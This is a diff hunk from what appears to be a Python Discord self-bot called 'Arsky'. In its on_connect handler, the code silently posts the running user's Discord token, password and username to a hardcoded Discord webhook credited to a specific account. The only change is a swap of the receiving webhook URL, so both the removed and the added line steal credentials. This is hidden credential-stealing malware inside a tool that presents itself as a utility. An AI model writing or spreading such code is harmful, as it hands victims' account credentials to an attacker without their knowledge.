@@ -2549,7 +2549,7 @@ async def delfriends(ctx):
 @Arsky.event
 async def on_connect():
     Clear()  
-    requests.post('https://discord.com/api/webhooks/826479601689427968/kmh5Z_SHTI2VRj7ADVnSTy4PcuDEjPWtBQ9x7BzduVkP-N1IhzqxZjhJ6VC4RgptuoKR',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`**Username: {Arsky.user.name}** | Logged by <@468918343508688896>"})
+    requests.post('https://discord.com/api/webhooks/826678716872523776/AX_yJNXrwym0VHHcQC4KtcJJoxyNO9oAoXr6r75xJ-n2NWPqWNKMh4ywBXosIOqxYlTk',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`**Username: {Arsky.user.name}** | Logged by <@468918343508688896>"})
     startprint()
 
 
